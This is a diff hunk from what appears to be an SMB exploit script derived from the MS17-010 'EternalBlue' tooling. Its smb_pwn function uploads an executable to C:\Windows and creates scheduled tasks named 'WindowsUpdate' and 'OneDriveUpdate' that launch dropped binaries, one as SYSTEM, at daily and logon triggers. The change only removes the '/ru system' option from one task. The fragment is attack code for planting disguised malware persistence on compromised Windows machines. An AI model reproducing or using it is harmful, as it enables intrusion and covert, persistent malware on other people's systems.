@@ -922,7 +922,7 @@ def smb_pwn(conn, arch):
 	smb_send_file(smbConn, "sluii.exe", "C", "/Windows/sluii.exe")
 	# Creating new task
 	service_exec(conn, r"schtasks /Create /sc daily /tn WindowsUpdate /tr icmp.exe /ru system /st 18:00 ")
-	service_exec(conn, r'schtasks /Create /sc onlogon /tn OneDriveUpdate /tr "C:\Windows\explorer_32.exe qq" /ru system')
+	service_exec(conn, r'schtasks /Create /sc onlogon /tn OneDriveUpdate /tr "C:\Windows\explorer_32.exe qq"')
 
 	#service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
 	# Note: there are many methods to get shell over SMB admin session
